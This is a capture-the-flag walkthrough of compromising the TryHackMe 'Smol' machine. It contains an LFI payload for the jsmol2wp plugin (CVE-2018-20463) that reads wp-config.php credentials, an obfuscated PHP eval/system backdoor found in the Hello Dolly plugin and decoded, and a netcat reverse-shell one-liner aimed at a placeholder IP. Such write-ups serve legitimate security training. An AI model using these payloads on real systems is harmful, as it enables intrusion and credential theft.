> In this walkthrough, we compromise the TryHackMe **Smol** machine by exploiting a vulnerable **WordPress** plugin to achieve file read and uncover a hidden backdoor in the **Hello Dolly** plugin. This leads to remote command execution via the admin panel. From there, we pivot by cracking WordPress password hashes, reuse credentials, abuse weak permissions to steal SSH keys, and escalate privileges through misconfigurations to gain root access.

## CVE-2018-20463 Analysis

Searching for `jsmol2wp v1.07` vulnerabilities, we find:

- [https://nvd.nist.gov/vuln/detail/CVE-2018-20463](https://nvd.nist.gov/vuln/detail/CVE-2018-20463)

    ![](nvd_nist_gov_cve_2018_20463.png){: width="800" height="400" .shadow }

- [https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt)

	![](github_PoC_cve_2018_20463.png){: width="800" height="400" .shadow }


Both CVEs describe an **arbitrary file read** vulnerability.

### What’s happening here?

The plugin exposes this endpoint:

```
/wp-content/plugins/jsmol2wp/php/jsmol.php
```

It takes user input and passes it into a backend function without proper validation.

That means we can abuse:

- `php://filter` → to read files
    
- `../../../../` → to traverse directories
    
So basically, classic LFI → file disclosure.

---

### Exploitation

Using the PoC:

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php
?isform=true
&call=getRawDataFromDatabase
&query=php://filter/resource=../../../../wp-config.php
```

Testing it on the target:

![](exec_lfi_payload_wpuser_creds_exposed.png){: width="800" height="400" .shadow }

**And it works — we can read `wp-config.php` and grab the `wpuser` credentials.**

Inside it, the first note said:

---

So I searched online for the `Hello Dolly` plugin and found its source code on [GitHub](https://github.com/WordPress/hello-dolly):  

![](wp_hello_dolly_lugin_github.png){: width="800" height="400" .shadow }

I also looked into the WordPress project structure to understand where plugins are stored. Typically, plugins are located in:

```text
/wp-content/plugins
```

![](search_about_wp_plugins_located.png){: width="800" height="400" .shadow }

---

Since we previously managed to read `wp-config.php` (which is located in the root directory alongside `wp-content`), I figured we could try reading the `hello.php` file using the same LFI technique.

I crafted this payload:

```text
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello-dolly/hello.php
```

But it didn’t work.

---

After digging a bit more, I found that plugin installation structure can differ between older and newer WordPress versions.

- Older versions sometimes install plugins like `hello-dolly` as a single file directly:

```text
/wp-content/plugins/hello.php
```

- Newer versions usually place plugins inside their own directory:

```text
/wp-content/plugins/hello-dolly/hello.php
```

---

But here’s the interesting part: our WordPress version is **6.7.1**, which is a newer version. So why didn’t the second path work?

One possible explanation is that the site was upgraded from an older version, and the plugin was already installed before the upgrade. In that case, WordPress might keep the old structure instead of reorganizing it.

---

So I tried the payload again, but this time using the old path:

```text
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
````

And this time — it worked.

![](backdoor_found.png){: width="800" height="400" .shadow }

We successfully found the backdoor.

```php
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

---

### Decoding the payload

To understand what this does, I decoded the base64 string:

```shell
$ echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d

if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
```
{: .nolineno }

---

At first glance, the parameter looks weird:

```text
\143\155\x64
```

This is obfuscated using a mix of **octal** (`\143`, `\155`) and **hex** (`\x64`) encoding — a common trick used to hide malicious behavior and bypass simple detections.

I tried deobfuscating it using [mlab.sh](https://mlab.sh/tool/jsdeobfuscator):

![](jsdeobfuscator.png){: width="800" height="400" .shadow }

It resolves to:

```text
cmd
```

---

### Final behavior

So the actual logic of the backdoor becomes:

```php
if (isset($_GET["cmd"])) {
    system($_GET["cmd"]);
}
```

Meaning:

- It checks if the `cmd` parameter exists
    
- If it does, it executes it as a system command

So now we can execute commands using:

```text
/hello.php?cmd=<PAYLOAD_HERE>
```

## Shell as www-data

For the reverse shell, I used:

```shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> 9001 > /tmp/f
```
{: .nolineno }`

Start a listener:

```shell
nc -lvnp 9001
```
{: .nolineno }

Then trigger it:

```text
http://www.smol.thm/wp-content/plugins/hello.php?cmd=<URL_ENCODED_PAYLOAD>
```

---

But unfortunately, `hello.php` was **not directly accessible** from that path.

After searching more about how the **Hello Dolly** plugin behaves, I found that it doesn't need to be accessed directly. Instead, it gets loaded automatically inside the WordPress admin panel.

You can confirm that by noticing the random lyrics displayed at the top of the admin dashboard:

![](holly_dolly_detect_rand_lyrics_in_wp_admin.png){: width="800" height="400" .shadow }

This means the plugin code is being executed when the admin panel loads — specifically the `hello_dolly()` function.

---

So instead of accessing the file directly, we can trigger our payload through the admin panel itself:

```text
http://www.smol.thm/wp-admin/index.php?cmd=<URL_ENCODED_PAYLOAD>
````

Once triggered, the payload gets executed.

And just like that, we obtained a reverse shell as:

```text
www-data
```

![](www_data_sehll.png){: width="800" height="400" .shadow }

---
